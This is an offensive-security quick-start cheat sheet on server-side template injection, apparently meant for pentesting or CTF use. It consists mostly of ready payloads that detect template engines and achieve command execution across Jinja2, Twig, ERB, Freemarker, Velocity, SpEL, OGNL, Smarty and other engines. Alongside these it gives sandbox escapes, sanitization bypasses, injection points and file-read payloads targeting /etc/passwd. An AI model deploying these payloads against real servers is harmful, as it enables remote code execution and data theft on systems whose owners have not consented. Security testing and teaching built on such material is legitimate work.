# SSTI — Quick Start

## Detection (30 seconds)

### Fuzzing payload

Submit each: `${7*7}` `{{7*7}}` `<%= 7*7 %>` `#{7*7}` `*{7*7}` `@{7*7}` `${{7*7}}`. If response shows `49`, SSTI confirmed.

### Mathematical test

```
{{7*7}}        # Jinja2/Twig: 49
${7*7}         # Freemarker/Velocity: 49
<%= 7*7 %>     # ERB: 49
${{7*7}}       # Spring SpEL
#{7*7}         # Ruby ERB / Spring
*{7*7}         # Spring/OGNL
@{7*7}         # Thymeleaf
{7*7}          # Mustache (no expressions)
```

## Engine identification

| Render of `{{7*7}}` | Engine |
|---|---|
| `49` | Jinja2, Twig, Smarty, Liquid |
| `7*7` (literal) | Mustache, Handlebars |
| Error mentioning `Twig_Error` | Twig |
| Error mentioning `jinja2` | Jinja2 |
| Error mentioning `freemarker` | Freemarker |
| Error mentioning `velocity` | Velocity |

| Render of `${7*7}` | Engine |
|---|---|
| `49` | Freemarker, Velocity, Spring SpEL |
| `${7*7}` literal | Not Java |

Cross-test with engine-specific syntax to confirm.

## Rapid exploitation by engine

### Jinja2 (Python)

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}                  # enumerate classes
{{ ''.__class__.__mro__[1].__subclasses__()[N]("id",shell=True,stdout=-1).communicate() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

### Twig (PHP)

```php
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ ['id'] | filter('system') }}
{{ ['cat /flag'] | filter('passthru') }}
```

### Twig (HTML-sanitized) / ERB / Tornado / Handlebars / Freemarker / Velocity / SpEL / OGNL / Smarty / Pebble

```
Twig sanitized:  {{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}
ERB:             <%= `id` %>  /  <%= system('id') %>  /  <%= File.read('/etc/passwd') %>
Tornado:         {% import os %}{{ os.popen('id').read() }}
Handlebars:      Long lookup chain — see ssti-cheat-sheet.md
Freemarker:      <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
Velocity:        #set($s="")…$s.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")
SpEL:            ${T(java.lang.Runtime).getRuntime().exec("id")}
OGNL:            %{(#cmd='id').(#runtime=@java.lang.Runtime@getRuntime()).(#runtime.exec(#cmd))}
Smarty 3+:       {system('id')}
Pebble:          {{ "x"|system("id") }}
```

## Common injection points

**GET params:** `?name=<payload>`, `?template=<payload>`, `?id=<payload>`.
**POST params:** form fields, JSON body fields rendered server-side.
**Headers:** `User-Agent`, `Referer` (when logged/displayed).
**File uploads:** SVG / DOCX content fields.
**Profile/settings:** display name, bio, signature.
**Email subjects** if templated.

## Context breakouts

```
Already inside expression: }}{{<payload>}}
String literal:            "}}{{<payload>}}{{
Attribute value:           %22%7d%7d{{<payload>}}{{
Comment block:             {{#comment}}{{/comment}}{{<payload>}}
```

## Burp workflow

1. Intercept request with potential SSTI input.
2. Send to Repeater.
3. Try `{{7*7}}` first — if `49`, identify engine.
4. Pull engine-specific RCE from above.
5. Confirm with `id` / `whoami` execution.

## Bypass HTML sanitization

When `htmlspecialchars()` strips `&`/`"`/`'`, SSTI in attributes:
- Single quotes (`'`) survive `htmlspecialchars()` default mode.
- Use single quotes for SSTI strings: `{{ ['id']|filter('system') }}`.
- Hex entities for special chars: `&#x27;` for `'`, `&#x22;` for `"` — decoded server-side.

## Sandbox escapes

**Jinja2 SandboxedEnvironment escape:**
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

The `__init__` chain bypasses sandbox restrictions on direct attribute access.

**Twig sandboxed:**
```php
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
```

## File read / Tools / Resources

```python
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
```

Tools: tplmap, SSTImap (https://github.com/vladko312/SSTImap), Burp Repeater, PayloadsAllTheThings/SSTI.

Resources: `ssti-cheat-sheet.md`, `ssti-resources.md`, PortSwigger SSTI labs.
